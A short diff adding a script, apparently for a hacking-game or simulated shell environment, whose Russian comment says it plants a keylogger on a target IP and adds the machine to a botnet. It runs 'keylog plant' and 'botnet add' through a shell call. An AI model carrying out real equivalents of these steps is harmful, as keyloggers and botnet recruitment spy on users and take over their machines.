@@ -1,0 +1,6 @@
+# Вербовщик: ставит кейлоггер и добавляет машину в ботнет
+ip = sys.args[1] if len(sys.args) > 1 else net.my_ip()
+r1 = shell.exec("keylog plant " + ip)
+print(r1["out"])
+r2 = shell.exec("botnet add " + ip)
+print(r2["out"])
